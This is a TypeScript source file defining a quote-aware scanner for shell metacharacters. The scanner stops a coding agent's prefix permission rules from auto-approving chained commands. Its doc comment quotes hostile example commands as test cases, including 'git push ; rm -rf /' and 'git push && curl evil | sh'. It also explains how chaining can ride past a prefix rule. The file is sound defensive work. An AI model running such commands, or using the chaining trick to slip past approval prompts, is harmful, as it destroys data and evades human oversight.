/**
 * Quote-aware scan for shell metacharacters that let one bash command become MULTIPLE commands
 * (or read/write past its own argv) once it actually reaches a shell — the exact hole a naive
 * string-prefix/exact rule match cannot see: `Bash(git push:*)` matching on the TEXT "git push"
 * says nothing about whether "git push" is the WHOLE command or just its first word before a `;`,
 * `&&`, `|`, or literal newline chains something else onto it entirely (SP-approvals T1 review,
 * empirically confirmed: `git push ; rm -rf /`, `git push && curl evil | sh`, and
 * `git push\nrm -rf /` all satisfied the old prefix check — whitespace-normalization even folded
 * that last one's newline into a plain space, hiding it from a naive comparison). Real Claude Code
 * refuses to auto-allow a compound command under a single-command prefix rule for exactly this
 * reason; this is the same posture enforced structurally, not left to a probabilistic reviewer
 * backstop to catch on a best-effort basis.
 *
 * Returns true when, OUTSIDE any quoting, `command` contains: `;`, `|`, `&` (covers `&&` and a
 * trailing background `&`), a literal newline, `>` or `<` (covers `>>`, `2>`, `&>`, heredoc `<<`,
 * and process substitution `<(`/`>(` — all of these start with a bare `<`/`>`, so no separate
 * check is needed for them), a backtick, `$(` command/arithmetic substitution (`$((` starts with
 * `$(` too), or `$'` ANSI-C quoting.
 *
 * Quote-awareness, empirically verified against real bash rather than assumed:
 *  - Single-quoted spans are fully inert. POSIX single quotes have no escape mechanism and
 *    perform no expansions of any kind — nothing between a `'` and its closing `'` is ever a
 *    hazard, including `$(...)`, backticks, or `;`/`|`/`&`.
 *  - Double-quoted spans suppress `;`, `|`, `&`, a literal newline, and `<`/`>` — these are
 *    tokenizer-level constructs (word-splitting, redirection) that quoting always neutralizes —
 *    but do NOT suppress command/arithmetic substitution: `` `...` `` and `$(...)` still execute
 *    inside `"..."` in a real shell, so this scanner keeps checking for them there too. A
 *    backslash inside a double-quoted span escapes the next character (mirroring bash's own
 *    `\$`, `` \` ``, `\"`, `\\` recognition), both so an escaped `"` can't prematurely end the
 *    scan and so an escaped `\$(...)`/`` \` `` is correctly treated as the literal (non-executing)
 *    text it actually is.
 *
 * Deliberately conservative OUTSIDE of quotes: a backslash there is NOT specially recognized, so
 * a legitimately-escaped separator (e.g. find's common `-exec ... \;` idiom) still reads as
 * hazardous here. A false positive only means "fall through to the approval card" — always the
 * safe direction for this function's callers — never a security hole, so erring toward
 * over-flagging beats the audit risk of a fuller escape-aware parser for a case no caller needs.
 *
 * Shared by `PermissionRules` (`ruleMatches` refuses to let a bash exact/prefix rule match a
 * hazardous command, so the human approval card always shows the FULL real command instead of a
 * chain riding a narrow prefix past them) and the upcoming `readOnlyBash` classifier
 * (SP-approvals Task 2 imports this too — its own "is this actually read-only" rejections are a
 * SUPERSET of what this function flags, so it composes on top of this rather than reimplementing
 * its own quote scanner).
 */
export function hasShellHazards(command: string): boolean {
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < command.length; i++) {
    const c = command[i];

    if (inSingle) {
      if (c === "'") inSingle = false;
      continue; // nothing inside a single-quoted span is ever a hazard
    }

    if (inDouble) {
      if (c === "\\") { i++; continue; } // \", \\, \$, \`, \<newline> — skip the escaped char either way
      if (c === '"') { inDouble = false; continue; }
      if (c === "`" || (c === "$" && command[i + 1] === "(")) return true; // NOT suppressed by "..."
      continue; // ; | & < > and a literal newline ARE inert inside "..."
    }

    // Outside any quote:
    if (c === "'") { inSingle = true; continue; }
    if (c === '"') { inDouble = true; continue; }
    if (c === "`") return true;
    if (c === "$" && (command[i + 1] === "(" || command[i + 1] === "'")) return true; // command/arithmetic substitution, ANSI-C quoting
    if (c === ";" || c === "|" || c === "&" || c === "\n" || c === ">" || c === "<") return true;
  }
  return inSingle || inDouble; // an unterminated quote is exactly the kind of ambiguity this scans for — never resolve it to "safe"
}
